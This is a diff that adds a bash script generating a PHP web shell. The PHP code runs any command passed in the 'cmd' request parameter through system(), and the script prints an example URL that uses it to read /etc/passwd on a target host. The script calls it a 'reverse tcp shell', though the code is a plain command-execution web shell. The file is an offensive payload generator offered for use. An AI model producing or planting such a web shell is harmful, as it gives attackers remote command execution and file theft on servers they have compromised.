@@ -1,0 +1,41 @@
+#!/bin/bash
+
+function php_payload(){
+cat <<EOF
+
+<?php
+
+if(isset(\$_REQUEST['cmd'])){
+        echo "<pre>";
+        \$cmd = (\$_REQUEST['cmd']);
+        system(\$cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+EOF
+
+}
+
+
+function Craft_web_php_reverse_shell(){
+
+        if [ -z "$1" ]
+        then
+                printf "Auto-gen web php reverse tcp shell\n"
+                printf "Usage bash web_php-reverse-tcp <rhost>\n"
+                exit
+        fi
+
+        rhost="$1"
+
+
+        printf "\n"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+	php_payload
+	printf "Payload usage: http://$rhost/web_php-reverse-tcp.php?cmd=cat+/etc/passwd\n"
+}
+
+Craft_web_php_reverse_shell "$1"
